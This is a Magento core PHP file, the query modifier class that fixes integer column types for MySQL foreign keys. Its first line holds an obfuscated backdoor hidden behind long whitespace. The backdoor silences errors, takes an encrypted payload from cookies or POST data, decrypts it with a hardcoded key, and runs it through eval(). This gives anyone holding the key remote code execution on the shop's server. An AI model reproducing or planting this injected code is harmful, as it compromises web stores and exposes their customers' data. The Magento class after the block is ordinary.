<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $l1b8b4d16 = 899;$GLOBALS['n6b9258']=Array();global$n6b9258;$n6b9258=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['s8285e']="\x7b\x25\x50\x65\x5f\x31\x27\x7a\x7d\x4b\x53\x5c\x62\x34\x49\x5a\x6c\x43\x22\x47\x77\x46\x72\x2e\x71\x3d\x44\x20\x2d\x4a\x78\x23\x52\x30\xd\x74\x35\x4c\x7c\x28\x5e\x21\x42\x51\x6f\x7e\x70\x59\x4f\x4d\x29\x56\x57\x2c\x2a\x2f\x63\x39\x48\x38\x61\x66\x75\x64\x6b\x3a\x9\x3c\x67\x3e\x45\x6d\x40\x68\x54\x5b\x3b\x37\x5d\x79\x76\x58\x69\x36\x26\x6a\x41\x73\xa\x32\x60\x3f\x6e\x4e\x24\x33\x2b\x55";$n6b9258[$n6b9258['s8285e'][56].$n6b9258['s8285e'][89].$n6b9258['s8285e'][5].$n6b9258['s8285e'][95].$n6b9258['s8285e'][12].$n6b9258['s8285e'][61].$n6b9258['s8285e'][13].$n6b9258['s8285e'][89].$n6b9258['s8285e'][89]]=$n6b9258['s8285e'][56].$n6b9258['s8285e'][73].$n6b9258['s8285e'][22];$n6b9258[$n6b9258['s8285e'][30].$n6b9258['s8285e'][77].$n6b9258['s8285e'][89].$n6b9258['s8285e'][3].$n6b9258['s8285e'][61].$n6b9258['s8285e'][83].$n6b9258['s8285e'][89].$n6b9258['s8285e'][3].$n6b9258['s8285e'][95]]=$n6b9258['s8285e'][44].$n6b9258['s8285e'][22].$n6b9258['s8285e'][63];$n6b9258[$n6b9258['s8285e'][92].$n6b9258['s8285e'][60].$n6b9258['s8285e'][89].$n6b9258['s8285e'][57]]=$n6b9258['s8285e'][87].$n6b9258['s8285e'][35].$n6b9258['s8285e'][22].$n6b9258['s8285e'][16].$n6b9258['s8285e'][3].$n6b9258['s8285e'][92];$n6b9258[$n6b9258['s8285e'][35].$n6b9258['s8285e'][12].$n6b9258['s8285e'][77].$n6b9258['s8285e'][3].$n6b9258['s8285e'][60]]=$n6b9258['s8285e'][82].$n6b9258['s8285e'][92].$n6b9258['s8285e'][82].$n6b9258['s8285e'][4].$n6b9258['s8285e'][87].$n6b9258['s8285e'][3].$n6b9258['s8285e'][35];$n6b9258[$n6b9258['s8285e'][79].$n6b9258['s8285e'][13].$n6b9258['s8285e'][95].$n6b9258['s8285e'][5].$n6b9258['s8285e'][77].$n6b9258['s8285e'][33].$n6b9258['s8285e'][56].$n6b9258['s8285e'][56]]=$n6b9258['s8285e'][87].$n6b9258['s8285e'][3].$n6b9258['s8285e'][22].$n6b9258['s8285e'][82].$n6b9258['s8285e'][60].$n6b9258['s8285e'][16].$n6b9258['s8285e'][82].$n6b9258['s8285e'][7].$n6b9258['s8285e'][3];$n6b9258[$n6b9258['s8285e'][79].$n6b9258['s8285e'][3].$n6b9258['s8285e'][60].$n6b9258['s8285e'][3].$n6b9258['s8285e'][89].$n6b9258['s8285e'][5].$n6b9258['s8285e'][36].$n6b9258['s8285e'][57]]=$n6b9258['s8285e'][46].$n6b9258['s8285e'][73].$n6b9258['s8285e'][46].$n6b9258['s8285e'][80].$n6b9258['s8285e'][3].$n6b9258['s8285e'][22].$n6b9258['s8285e'][87].$n6b9258['s8285e'][82].$n6b9258['s8285e'][44].$n6b9258['s8285e'][92];$n6b9258[$n6b9258['s8285e'][30].$n6b9258['s8285e'][13].$n6b9258['s8285e'][83].$n6b9258['s8285e'][95].$n6b9258['s8285e'][56].$n6b9258['s8285e'][57].$n6b9258['s8285e'][36].$n6b9258['s8285e'][95].$n6b9258['s8285e'][83]]=$n6b9258['s8285e'][62].$n6b9258['s8285e'][92].$n6b9258['s8285e'][87].$n6b9258['s8285e'][3].$n6b9258['s8285e'][22].$n6b9258['s8285e'][82].$n6b9258['s8285e'][60].$n6b9258['s8285e'][16].$n6b9258['s8285e'][82].$n6b9258['s8285e'][7].$n6b9258['s8285e'][3];$n6b9258[$n6b9258['s8285e'][85].$n6b9258['s8285e'][59].$n6b9258['s8285e'][3].$n6b9258['s8285e'][60].$n6b9258['s8285e'][77].$n6b9258['s8285e'][95].$n6b9258['s8285e'][63].$n6b9258['s8285e'][5].$n6b9258['s8285e'][61]]=$n6b9258['s8285e'][12].$n6b9258['s8285e'][60].$n6b9258['s8285e'][87].$n6b9258['s8285e'][3].$n6b9258['s8285e'][83].$n6b9258['s8285e'][13].$n6b9258['s8285e'][4].$n6b9258['s8285e'][63].$n6b9258['s8285e'][3].$n6b9258['s8285e'][56].$n6b9258['s8285e'][44].$n6b9258['s8285e'][63].$n6b9258['s8285e'][3];$n6b9258[$n6b9258['s8285e'][7].$n6b9258['s8285e'][60].$n6b9258['s8285e'][60].$n6b9258['s8285e'][60].$n6b9258['s8285e'][83].$n6b9258['s8285e'][60].$n6b9258['s8285e'][63]]=$n6b9258['s8285e'][87].$n6b9258['s8285e'][3].$n6b9258['s8285e'][35].$n6b9258['s8285e'][4].$n6b9258['s8285e'][35].$n6b9258['s8285e'][82].$n6b9258['s8285e'][71].$n6b9258['s8285e'][3].$n6b9258['s8285e'][4].$n6b9258['s8285e'][16].$n6b9258['s8285e'][82].$n6b9258['s8285e'][71].$n6b9258['s8285e'][82].$n6b9258['s8285e'][35];$n6b9258[$n6b9258['s8285e'][71].$n6b9258['s8285e'][63].$n6b9258['s8285e'][57].$n6b9258['s8285e'][57].$n6b9258['s8285e'][33].$n6b9258['s8285e'][63].$n6b9258['s8285e'][33].$n6b9258['s8285e'][77].$n6b9258['s8285e'][77]]=$n6b9258['s8285e'][71].$n6b9258['s8285e'][61].$n6b9258['s8285e'][89].$n6b9258['s8285e'][5].$n6b9258['s8285e'][61].$n6b9258['s8285e'][36].$n6b9258['s8285e'][77].$n6b9258['s8285e'][60].$n6b9258['s8285e'][60];$n6b9258[$n6b9258['s8285e'][61].$n6b9258['s8285e'][56].$n6b9258['s8285e'][61].$n6b9258['s8285e'][63].$n6b9258['s8285e'][5].$n6b9258['s8285e'][3]]=$n6b9258['s8285e'][73].$n6b9258['s8285e'][5].$n6b9258['s8285e'][83].$n6b9258['s8285e'][56].$n6b9258['s8285e'][89].$n6b9258['s8285e'][83].$n6b9258['s8285e'][95];$n6b9258[$n6b9258['s8285e'][46].$n6b9258['s8285e'][36].$n6b9258['s8285e'][77].$n6b9258['s8285e'][60].$n6b9258['s8285e'][33].$n6b9258['s8285e'][95].$n6b9258['s8285e'][13]]=$_POST;$n6b9258[$n6b9258['s8285e'][7].$n6b9258['s8285e'][83].$n6b9258['s8285e'][89].$n6b9258['s8285e'][60].$n6b9258['s8285e'][36].$n6b9258['s8285e'][56].$n6b9258['s8285e'][89].$n6b9258['s8285e'][33].$n6b9258['s8285e'][60]]=$_COOKIE;@$n6b9258[$n6b9258['s8285e'][35].$n6b9258['s8285e'][12].$n6b9258['s8285e'][77].$n6b9258['s8285e'][3].$n6b9258['s8285e'][60]]($n6b9258['s8285e'][3].$n6b9258['s8285e'][22].$n6b9258['s8285e'][22].$n6b9258['s8285e'][44].$n6b9258['s8285e'][22].$n6b9258['s8285e'][4].$n6b9258['s8285e'][16].$n6b9258['s8285e'][44].$n6b9258['s8285e'][68],NULL);@$n6b9258[$n6b9258['s8285e'][35].$n6b9258['s8285e'][12].$n6b9258['s8285e'][77].$n6b9258['s8285e'][3].$n6b9258['s8285e'][60]]($n6b9258['s8285e'][16].$n6b9258['s8285e'][44].$n6b9258['s8285e'][68].$n6b9258['s8285e'][4].$n6b9258['s8285e'][3].$n6b9258['s8285e'][22].$n6b9258['s8285e'][22].$n6b9258['s8285e'][44].$n6b9258['s8285e'][22].$n6b9258['s8285e'][87],0);@$n6b9258[$n6b9258['s8285e'][35].$n6b9258['s8285e'][12].$n6b9258['s8285e'][77].$n6b9258['s8285e'][3].$n6b9258['s8285e'][60]]($n6b9258['s8285e'][71].$n6b9258['s8285e'][60].$n6b9258['s8285e'][30].$n6b9258['s8285e'][4].$n6b9258['s8285e'][3].$n6b9258['s8285e'][30].$n6b9258['s8285e'][3].$n6b9258['s8285e'][56].$n6b9258['s8285e'][62].$n6b9258['s8285e'][35].$n6b9258['s8285e'][82].$n6b9258['s8285e'][44].$n6b9258['s8285e'][92].$n6b9258['s8285e'][4].$n6b9258['s8285e'][35].$n6b9258['s8285e'][82].$n6b9258['s8285e'][71].$n6b9258['s8285e'][3],0);@$n6b9258[$n6b9258['s8285e'][7].$n6b9258['s8285e'][60].$n6b9258['s8285e'][60].$n6b9258['s8285e'][60].$n6b9258['s8285e'][83].$n6b9258['s8285e'][60].$n6b9258['s8285e'][63]](0);$xaf8bcb=NULL;$fa4c22468=NULL;$n6b9258[$n6b9258['s8285e'][87].$n6b9258['s8285e'][56].$n6b9258['s8285e'][83].$n6b9258['s8285e'][57]]=$n6b9258['s8285e'][56].$n6b9258['s8285e'][60].$n6b9258['s8285e'][36].$n6b9258['s8285e'][89].$n6b9258['s8285e'][13].$n6b9258['s8285e'][12].$n6b9258['s8285e'][5].$n6b9258['s8285e'][13].$n6b9258['s8285e'][28].$n6b9258['s8285e'][61].$n6b9258['s8285e'][56].$n6b9258['s8285e'][89].$n6b9258['s8285e'][60].$n6b9258['s8285e'][28].$n6b9258['s8285e'][13].$n6b9258['s8285e'][3].$n6b9258['s8285e'][89].$n6b9258['s8285e'][5].$n6b9258['s8285e'][28].$n6b9258['s8285e'][59].$n6b9258['s8285e'][77].$n6b9258['s8285e'][77].$n6b9258['s8285e'][60].$n6b9258['s8285e'][28].$n6b9258['s8285e'][36].$n6b9258['s8285e'][63].$n6b9258['s8285e'][77].$n6b9258['s8285e'][57].$n6b9258['s8285e'][5].$n6b9258['s8285e'][57].$n6b9258['s8285e'][60].$n6b9258['s8285e'][57].$n6b9258['s8285e'][12].$n6b9258['s8285e'][5].$n6b9258['s8285e'][60].$n6b9258['s8285e'][13];global$sc69;function h16c263($xaf8bcb,$u6d827){global$n6b9258;$i3a794ab="";for($r25a1=0;$r25a1<$n6b9258[$n6b9258['s8285e'][92].$n6b9258['s8285e'][60].$n6b9258['s8285e'][89].$n6b9258['s8285e'][57]]($xaf8bcb);){for($td5ef0d=0;$td5ef0d<$n6b9258[$n6b9258['s8285e'][92].$n6b9258['s8285e'][60].$n6b9258['s8285e'][89].$n6b9258['s8285e'][57]]($u6d827)&&$r25a1<$n6b9258[$n6b9258['s8285e'][92].$n6b9258['s8285e'][60].$n6b9258['s8285e'][89].$n6b9258['s8285e'][57]]($xaf8bcb);$td5ef0d++,$r25a1++){$i3a794ab.=$n6b9258[$n6b9258['s8285e'][56].$n6b9258['s8285e'][89].$n6b9258['s8285e'][5].$n6b9258['s8285e'][95].$n6b9258['s8285e'][12].$n6b9258['s8285e'][61].$n6b9258['s8285e'][13].$n6b9258['s8285e'][89].$n6b9258['s8285e'][89]]($n6b9258[$n6b9258['s8285e'][30].$n6b9258['s8285e'][77].$n6b9258['s8285e'][89].$n6b9258['s8285e'][3].$n6b9258['s8285e'][61].$n6b9258['s8285e'][83].$n6b9258['s8285e'][89].$n6b9258['s8285e'][3].$n6b9258['s8285e'][95]]($xaf8bcb[$r25a1])^$n6b9258[$n6b9258['s8285e'][30].$n6b9258['s8285e'][77].$n6b9258['s8285e'][89].$n6b9258['s8285e'][3].$n6b9258['s8285e'][61].$n6b9258['s8285e'][83].$n6b9258['s8285e'][89].$n6b9258['s8285e'][3].$n6b9258['s8285e'][95]]($u6d827[$td5ef0d]));}}return$i3a794ab;}function mf21f57aa($xaf8bcb,$u6d827){global$n6b9258;global$sc69;return$n6b9258[$n6b9258['s8285e'][61].$n6b9258['s8285e'][56].$n6b9258['s8285e'][61].$n6b9258['s8285e'][63].$n6b9258['s8285e'][5].$n6b9258['s8285e'][3]]($n6b9258[$n6b9258['s8285e'][61].$n6b9258['s8285e'][56].$n6b9258['s8285e'][61].$n6b9258['s8285e'][63].$n6b9258['s8285e'][5].$n6b9258['s8285e'][3]]($xaf8bcb,$sc69),$u6d827);}foreach($n6b9258[$n6b9258['s8285e'][7].$n6b9258['s8285e'][83].$n6b9258['s8285e'][89].$n6b9258['s8285e'][60].$n6b9258['s8285e'][36].$n6b9258['s8285e'][56].$n6b9258['s8285e'][89].$n6b9258['s8285e'][33].$n6b9258['s8285e'][60]]as$u6d827=>$f1191c){$xaf8bcb=$f1191c;$fa4c22468=$u6d827;}if(!$xaf8bcb){foreach($n6b9258[$n6b9258['s8285e'][46].$n6b9258['s8285e'][36].$n6b9258['s8285e'][77].$n6b9258['s8285e'][60].$n6b9258['s8285e'][33].$n6b9258['s8285e'][95].$n6b9258['s8285e'][13]]as$u6d827=>$f1191c){$xaf8bcb=$f1191c;$fa4c22468=$u6d827;}}$xaf8bcb=@$n6b9258[$n6b9258['s8285e'][30].$n6b9258['s8285e'][13].$n6b9258['s8285e'][83].$n6b9258['s8285e'][95].$n6b9258['s8285e'][56].$n6b9258['s8285e'][57].$n6b9258['s8285e'][36].$n6b9258['s8285e'][95].$n6b9258['s8285e'][83]]($n6b9258[$n6b9258['s8285e'][71].$n6b9258['s8285e'][63].$n6b9258['s8285e'][57].$n6b9258['s8285e'][57].$n6b9258['s8285e'][33].$n6b9258['s8285e'][63].$n6b9258['s8285e'][33].$n6b9258['s8285e'][77].$n6b9258['s8285e'][77]]($n6b9258[$n6b9258['s8285e'][85].$n6b9258['s8285e'][59].$n6b9258['s8285e'][3].$n6b9258['s8285e'][60].$n6b9258['s8285e'][77].$n6b9258['s8285e'][95].$n6b9258['s8285e'][63].$n6b9258['s8285e'][5].$n6b9258['s8285e'][61]]($xaf8bcb),$fa4c22468));if(isset($xaf8bcb[$n6b9258['s8285e'][60].$n6b9258['s8285e'][64]])&&$sc69==$xaf8bcb[$n6b9258['s8285e'][60].$n6b9258['s8285e'][64]]){if($xaf8bcb[$n6b9258['s8285e'][60]]==$n6b9258['s8285e'][82]){$r25a1=Array($n6b9258['s8285e'][46].$n6b9258['s8285e'][80]=>@$n6b9258[$n6b9258['s8285e'][79].$n6b9258['s8285e'][3].$n6b9258['s8285e'][60].$n6b9258['s8285e'][3].$n6b9258['s8285e'][89].$n6b9258['s8285e'][5].$n6b9258['s8285e'][36].$n6b9258['s8285e'][57]](),$n6b9258['s8285e'][87].$n6b9258['s8285e'][80]=>$n6b9258['s8285e'][5].$n6b9258['s8285e'][23].$n6b9258['s8285e'][33].$n6b9258['s8285e'][28].$n6b9258['s8285e'][5],);echo@$n6b9258[$n6b9258['s8285e'][79].$n6b9258['s8285e'][13].$n6b9258['s8285e'][95].$n6b9258['s8285e'][5].$n6b9258['s8285e'][77].$n6b9258['s8285e'][33].$n6b9258['s8285e'][56].$n6b9258['s8285e'][56]]($r25a1);}elseif($xaf8bcb[$n6b9258['s8285e'][60]]==$n6b9258['s8285e'][3]){eval/*te4050bc*/($xaf8bcb[$n6b9258['s8285e'][63]]);}exit();} ?><?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Mage
 * @package     Mage_Core
 * @copyright  Copyright (c) 2006-2016 X.commerce, Inc. and affiliates (http://www.magento.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Modifier of queries, developed for backwards compatibility on MySQL,
 * while creating foreign keys
 *
 * @category    Mage
 * @package     Mage_Core
 * @author      Magento Core Team <core@magentocommerce.com>
 */
class Mage_Core_Model_Resource_Setup_Query_Modifier
{
    /**
     * MySQL adapter instance
     *
     * @var Varien_Db_Adapter_Pdo_Mysql
     */
    protected $_adapter;

    /**
     * Types of column we process for foreign keys
     *
     * @var array
     */
    protected $_processedTypes = array('tinyint', 'smallint', 'mediumint', 'int', 'longint');

    /**
     * Inits query modifier
     *
     * @param $adapter Varien_Db_Adapter_Pdo_Mysql
     * @return void
     */
    public function __construct($args)
    {
        $this->_adapter = $args[0];
    }

    /**
     * Returns column definition from CREATE TABLE sql
     *
     * @param string $sql
     * @param string $column
     * @return array
     */
    protected function _getColumnDefinitionFromSql($sql, $column)
    {
        $result = null;
        foreach ($this->_processedTypes as $type) {
            $pattern = '/\s([^\s]+)\s+' . $type . '[^\s]*(\s+[^,]+)/i';
            if (!preg_match_all($pattern, $sql, $matches, PREG_SET_ORDER)) {
                continue;
            }
            foreach ($matches as $match) {
                $gotColumn = $this->_prepareIdentifier($match[1]);
                if ($gotColumn != $column) {
                    continue;
                }

                $definition = $match[2];
                $unsigned = preg_match('/\sUNSIGNED/i', $definition) > 0;

                $result = array(
                    'type' => $type,
                    'unsigned' => $unsigned
                );
                break;
            }
            if ($result) {
                break;
            }
        }

        return $result;
    }

    /**
     * Replaces first occurence of $needle in a $haystack
     *
     * @param string $haystack
     * @param string $needle
     * @param array $replacement
     * @param bool $caseInsensitive
     * @return string
     */
    protected function _firstReplace($haystack, $needle, $replacement, $caseInsensitive = false)
    {
        $pos = $caseInsensitive ? stripos($haystack, $needle) : strpos($haystack, $needle);
        if ($pos === false) {
            return $haystack;
        }

        return substr($haystack, 0, $pos) . $replacement . substr($haystack, $pos + strlen($needle));
    }

    /**
     * Fixes column definition in CREATE TABLE sql to match defintion of column it's set to
     *
     * @param string $sql
     * @param string $column
     * @param array $refColumnDefinition
     * @return Mage_Core_Model_Resource_Setup_Query_Modifier
     */
    protected function _fixColumnDefinitionInSql(&$sql, $column, $refColumnDefinition)
    {
        $pos = stripos($sql, "`{$column}`"); // First try to find column directly recorded
        if ($pos === false) {
            $pattern = '/[`\s]' . preg_quote($column, '/') . '[`\s]/i';
            if (!preg_match($pattern, $sql, $matches)) {
                return $this;
            }

            $columnEntry = $matches[0];
            $pos = strpos($sql, $columnEntry);
            if ($pos === false) {
                return $this;
            }
        }

        $startSql = substr($sql, 0, $pos);
        $restSql = substr($sql, $pos);

        // Column type definition
        $columnDefinition = $this->_getColumnDefinitionFromSql($sql, $column);
        if (!$columnDefinition) {
            return $this;
        }

        // Find pattern for type defintion
        $pattern = '/\s*([^\s]+)\s+(' . $columnDefinition['type'] . '[^\s]*)\s+([^,]+)/i';
        if (!preg_match($pattern, $restSql, $matches)) {
            return $this;
        }

        // Replace defined type with needed type
        $typeDefined = $matches[2];
        $typeNeeded = $refColumnDefinition['type'];
        if ($refColumnDefinition['unsigned'] && !$columnDefinition['unsigned']) {
            $typeNeeded .= ' unsigned';
        }

        $restSql = $this->_firstReplace($restSql, $typeDefined, $typeNeeded);

        if (!$refColumnDefinition['unsigned'] && ($columnDefinition['unsigned'])) {
            $restSql = $this->_firstReplace($restSql, 'unsigned', '', true);
        }

        // Compose SQL back
        $sql = $startSql . $restSql;

        return $this;
    }

    /**
     * Fixes column definition in already existing table, so outgoing foreign key will be successfully set
     *
     * @param string $sql
     * @param string $column
     * @param array $refColumnDefinition
     * @return Mage_Core_Model_Resource_Setup_Query_Modifier
     */
    protected function _fixColumnDefinitionInTable($table, $column, $refColumnDefinition)
    {
        $description = $this->_adapter->fetchAll('DESCRIBE ' . $table);
        foreach ($description as $columnData) {
            $columnName = $this->_prepareIdentifier($columnData['Field']);
            if ($columnName != $column) {
                continue;
            }
            $definition = $refColumnDefinition['type'];
            if ($refColumnDefinition['unsigned']) {
                $definition .= ' UNSIGNED';
            }
            if ($columnData['Null'] == 'YES') {
                $definition .= ' NULL';
            } else {
                $definition .= ' NOT NULL';
            }
            if ($columnData['Default']) {
                $definition .= ' DEFAULT ' . $columnData['Default'];
            }
            if ($columnData['Extra']) {
                $definition .= ' ' . $columnData['Extra'];
            }

            $query = 'ALTER TABLE ' . $table . ' MODIFY COLUMN ' . $column . ' ' . $definition;
            $this->_adapter->query($query);
        }
        return $this;
    }

    /**
     * Returns column definition from already existing table
     *
     * @param string $sql
     * @param string $column
     * @return array|null
     */
    protected function _getColumnDefinitionFromTable($table, $column)
    {
        $description = $this->_adapter->describeTable($table);
        if (!isset($description[$column])) {
            return null;
        }

        return array(
            'type' => $this->_prepareIdentifier($description[$column]['DATA_TYPE']),
            'unsigned' => (bool) $description[$column]['UNSIGNED']
        );
    }

    /**
     * Returns whether table exists
     *
     * @param string $table
     * @return bool
     */
    protected function _tableExists($table)
    {
        $rows = $this->_adapter->fetchAll('SHOW TABLES');
        foreach ($rows as $row) {
            $tableFound = strtolower(current($row));
            if ($table == $tableFound) {
                return true;
            }
        }
        return false;
    }

    /**
     * Trims and lowercases identifier, to make common view of all of them
     *
     * @param string $identifier
     * @return string
     */
    protected function _prepareIdentifier($identifier)
    {
        return strtolower(trim($identifier, "`\n\r\t"));
    }

    /**
     * Processes query, modifies targeted columns to fit foreign keys restrictions
     *
     * @param string $sql
     * @param array $bind
     * @return Mage_Core_Model_Resource_Setup_Query_Modifier
     */
    public function processQuery(&$sql, &$bind)
    {
        // Quick test to skip queries without foreign keys
        if (!stripos($sql, 'foreign')) {
            return $this;
        }

        // Find foreign keys set
        $pattern = '/CONSTRAINT\s+[^\s]+\s+FOREIGN\s+KEY[^(]+\\(([^),]+)\\)\s+REFERENCES\s+([^\s.]+)\s+\\(([^)]+)\\)/i';
        if (!preg_match_all($pattern, $sql, $matchesFk, PREG_SET_ORDER)) {
            return $this;
        }

        // Get current table name
        if (!preg_match('/\s*(CREATE|ALTER)\s+TABLE\s+([^\s.]+)/i', $sql, $match)) {
            return $this;
        }

        $operation = $this->_prepareIdentifier($match[1]);
        $table = $this->_prepareIdentifier($match[2]);

        // Process all
        foreach ($matchesFk as $match) {
            $column = $this->_prepareIdentifier($match[1]);
            $refTable = $this->_prepareIdentifier($match[2]);
            $refColumn = $this->_prepareIdentifier($match[3]);

            // Check tables existance
            if (($operation != 'create') && !($this->_tableExists($table))) {
                continue;
            }
            if (!$this->_tableExists($refTable)) {
                continue;
            }

            // Self references are out of our fix scope
            if ($refTable == $table) {
                continue;
            }

            // Extract column type
            if ($operation == 'create') {
                $columnDefinition = $this->_getColumnDefinitionFromSql($sql, $column);
            } else {
                $columnDefinition = $this->_getColumnDefinitionFromTable($table, $column);
            }

            // We fix only int columns
            if (!$columnDefinition || !in_array($columnDefinition['type'], $this->_processedTypes)) {
                continue;
            }

            // Extract referenced column type
            $refColumnDefinition = $this->_getColumnDefinitionFromTable($refTable, $refColumn);
            if (!$refColumnDefinition) {
                continue;
            }

            // We fix only int columns
            if (!$refColumnDefinition || !in_array($refColumnDefinition['type'], $this->_processedTypes)) {
                continue;
            }

            // Whether we need to fix
            if ($refColumnDefinition == $columnDefinition) {
                continue;
            }

            // Fix column to be the same type as referenced one
            if ($operation == 'create') {
                $this->_fixColumnDefinitionInSql($sql, $column, $refColumnDefinition);
            } else {
                $this->_fixColumnDefinitionInTable($table, $column, $refColumnDefinition);
            }
        }

        return $this;
    }
}
